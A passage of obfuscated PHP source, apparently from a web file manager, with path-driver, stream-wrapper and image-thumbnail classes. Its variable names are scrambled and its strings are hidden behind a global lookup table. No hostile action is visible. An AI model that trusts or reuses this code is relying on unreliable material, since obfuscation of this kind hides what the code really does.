$this->getHost() . $a”×Œ‹‹‘‹[8] . $bèÁ•Äó¤ . $BÛ†Àº±×Ø; } public function fileOut($bëéœã×¢, $bâ…„ê²ÏÉ = false, $BëãÏŞ„„ = false, $C§Ê±ŸÃ‹Ğ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($bëéœã×¢, $bâ…„ê²ÏÉ, $BëãÏŞ„„, $C§Ê±ŸÃ‹Ğ); } if (!$BëãÏŞ„„) { $BëãÏŞ„„ = $this->pathThis($bëéœã×¢); } $bÆô†ñêàù = $bâ…„ê²ÏÉ ? array($_SERVER[‡’¶øåüç˜][1286] . rawurlencode($BëãÏŞ„„)) : array(); $a‘òå‰ÏôÉ = $this->link($bëéœã×¢, $bÆô†ñêàù); $this->fileOutLink($a‘òå‰ÏôÉ); } public function fileOutServer($d®º®ˆÙ¤è, $FÑÙ°¶¦²° = false, $c±»¾ÔîÌ = false, $f¨¸²’ƒ­¾ = '') { parent::fileOut($d®º®ˆÙ¤è, $FÑÙ°¶¦²°, $c±»¾ÔîÌ, $f¨¸²’ƒ­¾); } public function fileOutImage($d¨Ä¼ ¿³«, $A®³†ÍÚÑ = 250) { $fÖ‘¼éâáç = $this->link($d¨Ä¼ ¿³« . $_SERVER[‡’¶øåüç˜][1287] . $A®³†ÍÚÑ); $this->fileOutLink($fÖ‘¼éâáç); } public function fileOutImageServer($cîŠÙğÓÅ, $DÌµÂÅÒ¤¡ = 250) { parent::fileOutImage($cîŠÙğÓÅ, $DÌµÂÅÒ¤¡); } public function hashMd5($eª¢®©¨æ) { $F‚‡ù×Œ =& $_SERVER[‡’¶øåüç˜]; $a¡ÎšË¼ôÇ = $this->objectMeta($eª¢®©¨æ); return isset($a¡ÎšË¼ôÇ[$F‚‡ù×Œ[200]]) ? $a¡ÎšË¼ôÇ[$F‚‡ù×Œ[200]] : !1; } public function size($a¤…†‚«é¾) { $AŸñ³¬õš¥ = $this->objectMeta($a¤…†‚«é¾); return $AŸñ³¬õš¥ ? $AŸñ³¬õš¥[$_SERVER[‡’¶øåüç˜][77]] : 0; } public function info($eÆÍ£‡…Ö) { if ($this->isFolder($eÆÍ£‡…Ö)) { return $this->folderInfo($eÆÍ£‡…Ö); } else { if ($this->isFile($eÆÍ£‡…Ö)) { return $this->fileInfo($eÆÍ£‡…Ö); } } return !1; } public function exist($AŠ˜¹å°…š) { return $this->isFile($AŠ˜¹å°…š) || $this->isFolder($AŠ˜¹å°…š); } public function isFile($Cİ¤Íª²°À) { return !$this->isFolder($Cİ¤Íª²°À) && $this->objectMeta($Cİ¤Íª²°À); } public function isFolder($b¸¦šâé¦¿) { return $this->cacheMethod($_SERVER[‡’¶øåüç˜][227], $b¸¦šâé¦¿); } protected function objectMeta($f¸ˆñÙÂİ¼) { return $this->cacheMethod($_SERVER[‡’¶øåüç˜][228], $f¸ˆñÙÂİ¼); } protected function _objectMeta($e×Ñˆ‹¸¨‡) { goto Cª—¶·©; e¢ƒÑé„Ú¡: $eàõ¡‚í¬î = array($bÑõë…ï³¥[28] => get_path_this($e×Ñˆ‹¸¨‡), $bÑõë…ï³¥[29] => isset($f”ª‘ÜçÂˆ[$bÑõë…ï³¥[1289]]) ? $f”ª‘ÜçÂˆ[$bÑõë…ï³¥[1289]] : null, $bÑõë…ï³¥[77] => isset($f”ª‘ÜçÂˆ[$bÑõë…ï³¥[1290]]) ? $f”ª‘ÜçÂˆ[$bÑõë…ï³¥[1290]] : null, $bÑõë…ï³¥[200] => isset($f”ª‘ÜçÂˆ[$bÑõë…ï³¥[1291]]) ? $f”ª‘ÜçÂˆ[$bÑõë…ï³¥[1291]] : null, $bÑõë…ï³¥[1259] => isset($f”ª‘ÜçÂˆ[$bÑõë…ï³¥[1292]]) ? $f”ª‘ÜçÂˆ[$bÑõë…ï³¥[1292]] : null); $eàõ¡‚í¬î[$bÑõë…ï³¥[1260]] = isset($f”ª‘ÜçÂˆ[$bÑõë…ï³¥[1293]]) ? strtotime($f”ª‘ÜçÂˆ[$bÑõë…ï³¥[1293]]) : $eàõ¡‚í¬î[$bÑõë…ï³¥[1259]]; return $eàõ¡‚í¬î; goto dğë¿’‚Î‘; DÑ”¼©–»Ó: if (!$Eî¸÷ó½Ñ—[$bÑõë…ï³¥[1040]]) { return null; } $f”ª‘ÜçÂˆ = isset($Eî¸÷ó½Ñ—[$bÑõë…ï³¥[1042]]) ? $Eî¸÷ó½Ñ—[$bÑõë…ï³¥[1042]] : array(); if (!isset($f”ª‘ÜçÂˆ[$bÑõë…ï³¥[1289]])) { return null; } goto e¢ƒÑé„Ú¡; Cª—¶·©: $bÑõë…ï³¥ =& $_SERVER[‡’¶øåüç˜]; if ($e×Ñˆ‹¸¨‡ == $bÑõë…ï³¥[33] || $e×Ñˆ‹¸¨‡ == $bÑõë…ï³¥[8]) { return array(); } $Eî¸÷ó½Ñ— = $this->ussRequest($e×Ñˆ‹¸¨‡, $bÑõë…ï³¥[1288]); goto DÑ”¼©–»Ó; dğë¿’‚Î‘: } protected function _isFolder($bâ§ÍÔãîŞ) { $cÅ¢æ˜ˆà¸ =& $_SERVER[‡’¶øåüç˜]; if ($bâ§ÍÔãîŞ == $cÅ¢æ˜ˆà¸[33] || $bâ§ÍÔãîŞ == $cÅ¢æ˜ˆà¸[8]) { return !0; } $f«ãŠËÜ× = $this->objectMeta($bâ§ÍÔãîŞ); return isset($f«ãŠËÜ×[$cÅ¢æ˜ˆà¸[29]]) && $f«ãŠËÜ×[$cÅ¢æ˜ˆà¸[29]] == $cÅ¢æ˜ˆà¸[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($c­¬–íõÜ = false) { } public function exist($e ›Éôì‡À) { $c¤ÄŸì¥­Û = $this->info($e ›Éôì‡À); return $c¤ÄŸì¥­Û[$_SERVER[‡’¶øåüç˜][192]]; } public function isFile($c»Í÷‡ÙÈ) { $b¤•‡Ğœ‘§ = $this->info($c»Í÷‡ÙÈ); return $b¤•‡Ğœ‘§[$_SERVER[‡’¶øåüç˜][192]]; } public function isFolder($Fê¤‹¾´©) { return !1; } public function size($b¢Åˆô¤·†) { $dñßŒ“¢‚à = $this->info($b¢Åˆô¤·†); return $dñßŒ“¢‚à[$_SERVER[‡’¶øåüç˜][77]]; } public function info($cëÇ…¾Š¿¾) { return $this->infoParse($cëÇ…¾Š¿¾); } public function infoAuth($dáë¸Š…äŠ) { return $this->infoParse($dáë¸Š…äŠ); } public function infoWithChildren($CÚä´‹õ¾Ø) { return $this->infoParse($CÚä´‹õ¾Ø); } public function infoFull($FŸ‘ÃÆ‰›ê) { return $this->infoParse($FŸ‘ÃÆ‰›ê); } private function infoParse($fÇ÷Ø³¢Ñ®) { $EŒë¥İëÔ™ =& $_SERVER[‡’¶øåüç˜]; $C‘‡ˆÉ™Ê‹ = $this->header($fÇ÷Ø³¢Ñ®); if (!$C‘‡ˆÉ™Ê‹ || !$C‘‡ˆÉ™Ê‹[$EŒë¥İëÔ™[695]]) { return !1; } $b®Ù«¶ğÉ³ = _get($C‘‡ˆÉ™Ê‹, $EŒë¥İëÔ™[329], 0); $Eğ¾ôÀ‘µ = array($EŒë¥İëÔ™[28] => $C‘‡ˆÉ™Ê‹[$EŒë¥İëÔ™[28]], $EŒë¥İëÔ™[75] => $fÇ÷Ø³¢Ñ®, $EŒë¥İëÔ™[29] => $EŒë¥İëÔ™[171], $EŒë¥İëÔ™[77] => intval($b®Ù«¶ğÉ³), $EŒë¥İëÔ™[165] => get_path_ext($C‘‡ˆÉ™Ê‹[$EŒë¥İëÔ™[28]]), $EŒë¥İëÔ™[1169] => $b®Ù«¶ğÉ³ > 0 && $C‘‡ˆÉ™Ê‹[$EŒë¥İëÔ™[1294]], $EŒë¥İëÔ™[1170] => !1); return $Eğ¾ôÀ‘µ; } private function header($bÚ¤¾óâä) { if (isset(self::$_cacheHeader[$bÚ¤¾óâä])) { return self::$_cacheHeader[$bÚ¤¾óâä]; } self::$_cacheHeader[$bÚ¤¾óâä] = url_header($bÚ¤¾óâä); return self::$_cacheHeader[$bÚ¤¾óâä]; } public function hashSimple($cèÌŸ‚ø”, $Eµ°ò„±’ê = false) { goto B©õëë¥À­; aí¸…ŠéËÚ: $eÎ·÷ï²®Â = $fÒİ˜ßåÓ‚[$CñŒå¿â‘ê[77]]; $B°æòïá¥• = 200; $bĞ£ŒÙ„¢¥ = 50; goto e›ßˆï­¾; e›ßˆï­¾: if ($eÎ·÷ï²®Â <= $B°æòïá¥• * $bĞ£ŒÙ„¢¥) { return md5($this->fileSubstr($cèÌŸ‚ø”, 0, $eÎ·÷ï²®Â)) . $eÎ·÷ï²®Â; } $bµ’áÔŸ© = intval($eÎ·÷ï²®Â / $bĞ£ŒÙ„¢¥); $Cğ¨ß» î¤ = $CñŒå¿â‘ê[33]; goto fšâÄ‹†Ø—; fšâÄ‹†Ø—: $A” ’Ä…‡ = timeFloat(); $E”´‰²àÇ‹ = 15; for ($E„ù¹ğÕÃË = 0; $E„ù¹ğÕÃË < $bĞ£ŒÙ„¢¥; $E„ù¹ğÕÃË++) { if (timeFloat() - $A” ’Ä…‡ > $E”´‰²àÇ‹) { return !1; } $eã¬‚¾†à = $this->fileSubstr($cèÌŸ‚ø”, $bµ’áÔŸ© * $E„ù¹ğÕÃË, $B°æòïá¥•); if (!$eã¬‚¾†à) { return !1; } $Cğ¨ß» î¤ .= $eã¬‚¾†à; } goto fœ›¾—å‰¡; B©õëë¥À­: $CñŒå¿â‘ê =& $_SERVER[‡’¶øåüç˜]; $fÒİ˜ßåÓ‚ = $this->info($cèÌŸ‚ø”); if (!$fÒİ˜ßåÓ‚ || !$fÒİ˜ßåÓ‚[$CñŒå¿â‘ê[192]]) { return !1; } goto aí¸…ŠéËÚ; fœ›¾—å‰¡: $Cğ¨ß» î¤ .= $this->fileSubstr($cèÌŸ‚ø”, $eÎ·÷ï²®Â - $B°æòïá¥•, $B°æòïá¥•); return md5($Cğ¨ß» î¤) . $eÎ·÷ï²®Â; goto c§©‡œ×š; c§©‡œ×š: } public function getContent($fø¸Æ ¹¿) { return $this->fileSubstr($fø¸Æ ¹¿); } public function fileSubstr($d­¦êˆôã¼, $b’—°Ÿ„„ = 0, $d—Ï‡Ü‰Í = -1) { goto fº¤ÆŒ­Ëƒ; bÉªĞ«¨¯¼: $CÇò¨ôÜ–Æ = url_request($d­¦êˆôã¼, $AÖ»‘„òğ[220], !1, $E™œßÃ”éã, !1, !1, 1); return $CÇò¨ôÜ–Æ[$AÖ»‘„òğ[1042]] ? $CÇò¨ôÜ–Æ[$AÖ»‘„òğ[1042]] : $AÖ»‘„òğ[33]; goto E´“‰½ªÎ ; fº¤ÆŒ­Ëƒ: $AÖ»‘„òğ =& $_SERVER[‡’¶øåüç˜]; $A…À«Î¯ˆò = $this->info($d­¦êˆôã¼); if (!$A…À«Î¯ˆò || !$A…À«Î¯ˆò[$AÖ»‘„òğ[192]] && $A…À«Î¯ˆò[$AÖ»‘„òğ[77]] > 1024 * 1024 * 10) { return !1; } goto cÃ‘ãõ…‹ò; cÃ‘ãõ…‹ò: if ($d—Ï‡Ü‰Í === -1) { $d—Ï‡Ü‰Í = $A…À«Î¯ˆò[$AÖ»‘„òğ[77]]; } if ($d—Ï‡Ü‰Í == 0) { return $AÖ»‘„òğ[33]; } $E™œßÃ”éã = array($AÖ»‘„òğ[1295] . $b’—°Ÿ„„ . $AÖ»‘„òğ[721] . ($b’—°Ÿ„„ + $d—Ï‡Ü‰Í - 1)); goto bÉªĞ«¨¯¼; E´“‰½ªÎ : } public function download($aùİµÆÊŒÄ, $a…ÚÎ£ÊªÓ) { Downloader::start($aùİµÆÊŒÄ, $a…ÚÎ£ÊªÓ); return $a…ÚÎ£ÊªÓ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($FÑ²¬Ê¤¬™, $dõØÕ‘Ú¾ = '') { goto cæšÕã‡ßÜ; f‚×„ç„£: return $this->info ? !0 : !1; goto dÄÉ¹¹‘­Ì; c¿Ó‚ë¦²–: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$FÑ²¬Ê¤¬™])) { self::$_chunkBuffer[$FÑ²¬Ê¤¬™] = array(); } goto f‚×„ç„£; cæšÕã‡ßÜ: $this->info = $this->info($FÑ²¬Ê¤¬™); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[‡’¶øåüç˜][75]]; goto c¿Ó‚ë¦²–; dÄÉ¹¹‘­Ì: } function stream_read($A„ŠÎ¹åçİ) { $a‚Ù§Ÿòì = $this->fileSubstr($this->pose, $A„ŠÎ¹åçİ); $this->pose += strlen($a‚Ù§Ÿòì); return $a‚Ù§Ÿòì; } public function stream_tell() { return $this->pose; } public function stream_seek($A×…«Íœí, $Fñ†Š¡Ç÷) { $aÖÊ”Ó¥Ø² =& $_SERVER[‡’¶øåüç˜]; if ($Fñ†Š¡Ç÷ == SEEK_SET) { $this->pose = $A×…«Íœí; } else { if ($Fñ†Š¡Ç÷ == SEEK_CUR) { $this->pose += $A×…«Íœí; } else { if ($Fñ†Š¡Ç÷ == SEEK_END) { $this->pose = $this->info[$aÖÊ”Ó¥Ø²[77]] + intval($A×…«Íœí); } } } if ($A×…«Íœí < 0) { $this->pose = $this->info[$aÖÊ”Ó¥Ø²[77]] + $A×…«Íœí; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[‡’¶øåüç˜][77]]; } public function stream_close() { return !0; } public function url_stat($a®óæ–Ã¥Œ, $cô±‡ÆÕŞØ) { $Aß²øù°× =& $_SERVER[‡’¶øåüç˜]; $CâÊ…´¬‚ƒ = $this->info($a®óæ–Ã¥Œ); return array($Aß²øù°×[1296] => 0, $Aß²øù°×[1297] => 0, $Aß²øù°×[12] => 32768 + 511, $Aß²øù°×[1298] => 0, $Aß²øù°×[1299] => 0, $Aß²øù°×[1300] => 0, $Aß²øù°×[1301] => 0, $Aß²øù°×[77] => $CâÊ…´¬‚ƒ[$Aß²øù°×[77]], $Aß²øù°×[1302] => $CâÊ…´¬‚ƒ[$Aß²øù°×[1174]], $Aß²øù°×[1260] => $CâÊ…´¬‚ƒ[$Aß²øù°×[107]], $Aß²øù°×[1259] => $CâÊ…´¬‚ƒ[$Aß²øù°×[191]], $Aß²øù°×[1303] => 0, $Aß²øù°×[1304] => 0); } static $fileInfo = array(); public function info($fã‡¡ùŞ±‘) { $Få“¬Ú„Ñ = $_SERVER[‡’¶øåüç˜][1305]; if (isset(self::$fileInfo[$fã‡¡ùŞ±‘])) { return self::$fileInfo[$fã‡¡ùŞ±‘]; } if (substr($fã‡¡ùŞ±‘, 0, strlen($Få“¬Ú„Ñ)) != $Få“¬Ú„Ñ) { return !1; } self::$fileInfo[$fã‡¡ùŞ±‘] = IO::info(substr($fã‡¡ùŞ±‘, strlen($Få“¬Ú„Ñ))); return self::$fileInfo[$fã‡¡ùŞ±‘]; } public static function read($D©Šö±å†Ê, $aÙóà§ŞÏ›, $c¥¸ÅÄÇ) { goto cƒõ¬Æšº¸; dÔª¾˜ˆ¡: $d²ï³‘êˆ = 0; while ($d²ï³‘êˆ < $c¥¸ÅÄÇ) { $aÕè¨¼ê = min($d­õÇÈÅß, $c¥¸ÅÄÇ - $d²ï³‘êˆ); $bß‚š˜ó .= fread($f§´ª™š£Ÿ, $aÕè¨¼ê); $d²ï³‘êˆ += $aÕè¨¼ê; } fclose($f§´ª™š£Ÿ); goto AÏ‘­°‰Ì¿; cƒõ¬Æšº¸: $bé‰ø¯ó³Ç =& $_SERVER[‡’¶øåüç˜]; $f§´ª™š£Ÿ = fopen($D©Šö±å†Ê, $bé‰ø¯ó³Ç[1176]); if (!$f§´ª™š£Ÿ) { return $bé‰ø¯ó³Ç[33]; } goto c‡íÛÉ‘†Î; c‡íÛÉ‘†Î: $d­õÇÈÅß = 8192; fseek($f§´ª™š£Ÿ, $aÙóà§ŞÏ›, SEEK_SET); $bß‚š˜ó = $bé‰ø¯ó³Ç[33]; goto dÔª¾˜ˆ¡; AÏ‘­°‰Ì¿: return $bß‚š˜ó; goto d¹§´³Á…; d¹§´³Á…: } public function fileSubstr($Eõ‰Í¢¬÷æ, $b„èÁ¨á†¯) { goto Eêæãö‰ñç; f¯¹‹Æî°Æ: $dåÜœ—›ôÚ = 0; $aÕéĞŠ¿…¢ = 0; $aŸŒÃ¿¢® = $d‚Ç´È­Ë™[33]; goto fàÇçÈƒİœ; fºŠ®ÏÆÂæ: $dàéË…¤¡‘ = 64 * 1024; $F”â›Åóêä =& self::$_chunkBuffer[$this->path]; if (!$F”â›Åóêä) { $F”â›Åóêä = array(); } goto f¯¹‹Æî°Æ; AóÉÆ‰Ä: if ($Eõ‰Í¢¬÷æ + $b„èÁ¨á†¯ > $bÉÀÄëØå„) { $b„èÁ¨á†¯ = $bÉÀÄëØå„ - $Eõ‰Í¢¬÷æ; } if ($b„èÁ¨á†¯ <= 0) { return $d‚Ç´È­Ë™[33]; } if ($Eõ‰Í¢¬÷æ < 0 || $Eõ‰Í¢¬÷æ >= $bÉÀÄëØå„ || $b„èÁ¨á†¯ <= 0 || $b„èÁ¨á†¯ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\106\x69\154\145\x52\x65\x61\x64\x20\x65\x72\162\x6f\x72\41\40\163\x74\141\162\164\75{$Eõ‰Í¢¬÷æ}\73\154\145\156\x67\x74\x68\x3d{$b„èÁ¨á†¯}\73\40\163\x69\x7a\145\75{$bÉÀÄëØå„}\x3b"); } goto fºŠ®ÏÆÂæ; fØ—ö­éæ: ksort($F”â›Åóêä); $Fò÷ŠŠ°½õ = substr($e ¦Ö‡ö…, $Eõ‰Í¢¬÷æ - $eÑ±½À†Œ‰, $b„èÁ¨á†¯); return $Fò÷ŠŠ°½õ; goto dáÜğ°Õîê; E´‹‰»Ö¿ª: $Eç¡«âäùŞ = $b„èÁ¨á†¯; if ($Eõ‰Í¢¬÷æ < 0) { $Eõ‰Í¢¬÷æ = $bÉÀÄëØå„ + $Eõ‰Í¢¬÷æ; } if ($b„èÁ¨á†¯ === !1) { $b„èÁ¨á†¯ = $bÉÀÄëØå„ - $Eõ‰Í¢¬÷æ; } goto AóÉÆ‰Ä; Eêæãö‰ñç: $d‚Ç´È­Ë™ =& $_SERVER[‡’¶øåüç˜]; $bÉÀÄëØå„ = $this->info[$d‚Ç´È­Ë™[77]]; $a²š„Ì‚Ó× = $Eõ‰Í¢¬÷æ; goto E´‹‰»Ö¿ª; fàÇçÈƒİœ: foreach ($F”â›Åóêä as $dåÜœ—›ôÚ => $aŸŒÃ¿¢®) { $dåÜœ—›ôÚ = intval($dåÜœ—›ôÚ); $aÕéĞŠ¿…¢ = $dåÜœ—›ôÚ + strlen($aŸŒÃ¿¢®); if ($Eõ‰Í¢¬÷æ >= $aÕéĞŠ¿…¢) { continue; } if ($Eõ‰Í¢¬÷æ >= $dåÜœ—›ôÚ && $Eõ‰Í¢¬÷æ + $b„èÁ¨á†¯ <= $aÕéĞŠ¿…¢) { return substr($aŸŒÃ¿¢®, $Eõ‰Í¢¬÷æ - $dåÜœ—›ôÚ, $b„èÁ¨á†¯); } break; } if (count($F”â›Åóêä) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($d‚Ç´È­Ë™[1306], $d‚Ç´È­Ë™[1307] . count($F”â›Åóêä) . "\73\x73\164\141\x72\x74\75{$Eõ‰Í¢¬÷æ}\54\x6c\x65\156\147\164\150\75{$b„èÁ¨á†¯}\73\160\157\163\x65\x3a{$dåÜœ—›ôÚ}\x7e{$aÕéĞŠ¿…¢}"); throw new Exception($d‚Ç´È­Ë™[1308]); } $eÑ±½À†Œ‰ = intval($Eõ‰Í¢¬÷æ / $dàéË…¤¡‘) * $dàéË…¤¡‘; goto E©¨è¼Õ¶ø; E©¨è¼Õ¶ø: $AÃ›Š¶öÀ› = ceil(($Eõ‰Í¢¬÷æ + $b„èÁ¨á†¯) / $dàéË…¤¡‘) * $dàéË…¤¡‘ - $eÑ±½À†Œ‰; $e ¦Ö‡ö… = IO::fileSubstr($this->path, $eÑ±½À†Œ‰, $AÃ›Š¶öÀ›); $F”â›Åóêä[$eÑ±½À†Œ‰ . $d‚Ç´È­Ë™[33]] = $e ¦Ö‡ö…; goto fØ—ö­éæ; dáÜğ°Õîê: } private function log($e‹¾¿à»â¡, $a•‰¹ØÉ‘´) { $d•»™‰ÛŠ» =& $_SERVER[‡’¶øåüç˜]; $e¢¯íÎŒÑ = timeFloat() - $this->timeStart; write_log(sprintf($d•»™‰ÛŠ»[1309], $e‹¾¿à»â¡, $this->info[$d•»™‰ÛŠ»[28]], $e¢¯íÎŒÑ, $a•‰¹ØÉ‘´), $d•»™‰ÛŠ»[1225]); } } goto c¿’®º¯øò; a³Õç†šÌÈ: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($DùÎñ“Óé‚, $c£‰±ÇÜ”¢) { goto c“µ·èÇ á; Dë¡–öµó«: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto A‡ŒÙ«„—Æ; BòÖœ±ë: if (!$this->im) { return !1; } $F–â¶ÔÁ†ß = $_SERVER[‡’¶øåüç˜][33]; $this->imgData = GetImageSize($DùÎñ“Óé‚, $F–â¶ÔÁ†ß); goto Dë¡–öµó«; c“µ·èÇ á: $this->srcFile = $DùÎñ“Óé‚; $this->echoType = $c£‰±ÇÜ”¢; $this->im = self::image($DùÎñ“Óé‚); goto BòÖœ±ë; A‡ŒÙ«„—Æ: } public static function image($cºòƒŒñ„) { $BŸùÛŒøè¿ =& $_SERVER[‡’¶øåüç˜]; $e¦â®äÒ‘ = $BŸùÛŒøè¿[33]; $b¬’Ñ¸Œàò = GetImageSize($cºòƒŒñ„, $e¦â®äÒ‘); $eåªÙ³§Ö  = !1; switch ($b¬’Ñ¸Œàò[2]) { case IMAGETYPE_GIF: if (!function_exists($BŸùÛŒøè¿[1869])) { break; } $eåªÙ³§Ö  = imagecreatefromgif($cºòƒŒñ„); break; case IMAGETYPE_JPEG: if (!function_exists($BŸùÛŒøè¿[1870])) { break; } $eåªÙ³§Ö  = imagecreatefromjpeg($cºòƒŒñ„); break; case IMAGETYPE_PNG: if (!function_exists($BŸùÛŒøè¿[1871])) { break; } $eåªÙ³§Ö  = @imagecreatefrompng($cºòƒŒñ„); imagesavealpha($eåªÙ³§Ö , !0); break; case IMAGETYPE_XBM: $eåªÙ³§Ö  = imagecreatefromxbm($cºòƒŒñ„); break; case IMAGETYPE_WBMP: $eåªÙ³§Ö  = imagecreatefromwbmp($cºòƒŒñ„); break; case IMAGETYPE_BMP: $eåªÙ³§Ö  = imagecreatefrombmp($cºòƒŒñ„); break; default: break; } return $eåªÙ³§Ö ; } public static function imageSize($F×¯ÆÒç) { $e–ƒ¥†©ãò =& $_SERVER[‡’¶øåüç˜]; $EÓ‹ñ«¼èÉ = GetImageSize($F×¯ÆÒç); if (!$EÓ‹ñ«¼èÉ) { return !1; } return array($e–ƒ¥†©ãò[1872] => $EÓ‹ñ«¼èÉ[0], $e–ƒ¥†©ãò[1873] => $EÓ‹ñ«¼èÉ[1]); } function distortion($D¦ŒÁ’Ïù, $cï¥‡±ï„œ, $fµŞó³¯±İ) { $DÆ¯é«ÍáØ = $this->creatImage($this->im, $cï¥‡±ï„œ, $fµŞó³¯±İ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($DÆ¯é«ÍáØ, $D¦ŒÁ’Ïù); } function prorate($c¢¿‹ººÒ, $AÖÄäºš„Ï, $Eàéæ”ºóæ) { $cØÏç—Ìî’ = $AÖÄäºš„Ï / $Eàéæ”ºóæ; $Dô¹‚à”¼ = $this->srcW / $this->srcH; if ($cØÏç—Ìî’ <= $Dô¹‚à”¼) { $dˆÒŒ¥™ÚË = $AÖÄäºš„Ï; $f±ô¥é¢³ƒ = $dˆÒŒ¥™ÚË * ($this->srcH / $this->srcW); } else { $f±ô¥é¢³ƒ = $Eàéæ”ºóæ; $dˆÒŒ¥™ÚË = $f±ô¥é¢³ƒ * ($this->srcW / $this->srcH); } if ($this->srcW > $AÖÄäºš„Ï || $this->srcH > $Eàéæ”ºóæ) { $aª‡ô×ƒî× = $this->creatImage($this->im, $dˆÒŒ¥™ÚË, $f±ô¥é¢³ƒ, 0, 0, 0, 0, $this->srcW, $this->srcH); } else { $aª‡ô×ƒî× = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); } $aª‡ô×ƒî× = $this->autoRotate($aª‡ô×ƒî×); return $this->echoImage($aª‡ô×ƒî×, $c¢¿‹ººÒ); } private function autoRotate($cóìÖ§Ã§¶) { goto F—äí–Œ„¡; bÚäÆ£Ôº: if (!$aÌ¨õ½‹ || !isset($aÌ¨õ½‹[$cŸ‡ï…ç¥œ[1875]]) || $aÌ¨õ½‹[$cŸ‡ï…ç¥œ[1875]] == 1) { return $cóìÖ§Ã§¶; } $d®‹Á¡š³ = 0; if ($aÌ¨õ½‹[$cŸ‡ï…ç¥œ[1875]] == 6) { $d®‹Á¡š³ = 90; } goto E¡äÎÁÖœ; F—äí–Œ„¡: $cŸ‡ï…ç¥œ =& $_SERVER[‡’¶øåüç˜]; if (!$cóìÖ§Ã§¶ || !function_exists($cŸ‡ï…ç¥œ[1874])) { return $cóìÖ§Ã§¶; } $aÌ¨õ½‹ = exif_read_data($this->srcFile); goto bÚäÆ£Ôº; E¡äÎÁÖœ: if ($aÌ¨õ½‹[$cŸ‡ï…ç¥œ[1875]] == 8) { $d®‹Á¡š³ = 270; } if ($aÌ¨õ½‹[$cŸ‡ï…ç¥œ[1875]] == 3) { $d®‹Á¡š³ = 180; } return $this->rotateDegree($cóìÖ§Ã§¶, $d®‹Á¡š³); goto eÔš¨ÛÒŠ‚; eÔš¨ÛÒŠ‚: } private function rotateDegree($a‘¬ÎÈë–, $fÂ¸Ú†˜äÉ) { if (!$a‘¬ÎÈë– || $fÂ¸Ú†˜äÉ % 360 === 0 || !function_exists($_SERVER[‡’¶øåüç˜][1876])) { return $a‘¬ÎÈë–; } $b•‹œ‚ê¶Î = imageRotate($a‘¬ÎÈë–, 360 - $fÂ¸Ú†˜äÉ, 0); imageDestroy($a‘¬ÎÈë–); return $b•‹œ‚ê¶Î ? $b•‹œ‚ê¶Î : $a‘¬ÎÈë–; } function cut($Aöİ‰³˜œ, $DŸ£«¿¸·, $c¯¨êÌåÌâ) { goto A¤öÍŒµÏ¯; CÍ½öãÖÂÁ: $Eá°ŒÂ®­ = $this->creatImage($this->im, $F‹ÅÊÕ¨¶¬, $f”‘£Ç¡¼—, 0, 0, 0, 0, $this->srcW, $this->srcH); $A£„İÙ…Ô­ = $this->creatImage($Eá°ŒÂ®­, $DŸ£«¿¸·, $c¯¨êÌåÌâ, 0, 0, ($F‹ÅÊÕ¨¶¬ - $DŸ£«¿¸·) / 2, ($f”‘£Ç¡¼— - $c¯¨êÌåÌâ) / 2, $DŸ£«¿¸·, $c¯¨êÌåÌâ); imageDestroy($Eá°ŒÂ®­); goto dêæÃ™ØØÆ; A¤öÍŒµÏ¯: $cÀ·Ë¼å‘œ = $DŸ£«¿¸· / $c¯¨êÌåÌâ; $dÏ¾ëä›ªÓ = $this->srcW / $this->srcH; if ($cÀ·Ë¼å‘œ <= $dÏ¾ëä›ªÓ) { $f”‘£Ç¡¼— = $c¯¨êÌåÌâ; $F‹ÅÊÕ¨¶¬ = $f”‘£Ç¡¼— * ($this->srcW / $this->srcH); } else { $F‹ÅÊÕ¨¶¬ = $DŸ£«¿¸·; $f”‘£Ç¡¼— = $F‹ÅÊÕ¨¶¬ * ($this->srcH / $this->srcW); } goto CÍ½öãÖÂÁ; dêæÃ™ØØÆ: return $this->echoImage($A£„İÙ…Ô­, $Aöİ‰³˜œ); goto AÅõñÉ•Ş´; AÅõñÉ•Ş´: } function backFill($cæ¼–ê®Œ–, $aò—é·ÇŠ, $fÔÓ•©ªÈ¢, $fĞ–˜à—ß“ = false, $FÒÒİ‘ñ£ = 255, $DÜ•âÒ‡Ö = 255, $Cº¤¿ºñŞ× = 255) { goto Aİ»ºÄ¨Ùª; D®¦³„ì…é: if ($fĞ–˜à—ß“) { $bº™„å¢ï¿ = imageColorTransparent($Eöœ×Ô‹„, $bº™„å¢ï¿); $cøÛÜêŸË« = $fÔÓ•©ªÈ¢ - $bˆô¬ÀµÖ; } imageFilledRectangle($Eöœ×Ô‹„, 0, 0, $aò—é·ÇŠ, $fÔÓ•©ªÈ¢, $bº™„å¢ï¿); if ($this->srcW > $aò—é·ÇŠ || $this->srcH > $fÔÓ•©ªÈ¢) { $b»«Ë¯ç‚ = $this->creatImage($this->im, $bÈ‹Îõá°ƒ, $bˆô¬ÀµÖ, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($bÈ‹Îõá°ƒ < $aò—é·ÇŠ) { imageCopy($Eöœ×Ô‹„, $b»«Ë¯ç‚, ($aò—é·ÇŠ - $bÈ‹Îõá°ƒ) / 2, 0, 0, 0, $bÈ‹Îõá°ƒ, $bˆô¬ÀµÖ); } else { if ($bˆô¬ÀµÖ < $fÔÓ•©ªÈ¢) { imageCopy($Eöœ×Ô‹„, $b»«Ë¯ç‚, 0, $cøÛÜêŸË«, 0, 0, $bÈ‹Îõá°ƒ, $bˆô¬ÀµÖ); } else { imageCopy($Eöœ×Ô‹„, $b»«Ë¯ç‚, 0, 0, 0, 0, $bÈ‹Îõá°ƒ, $bˆô¬ÀµÖ); } } } else { 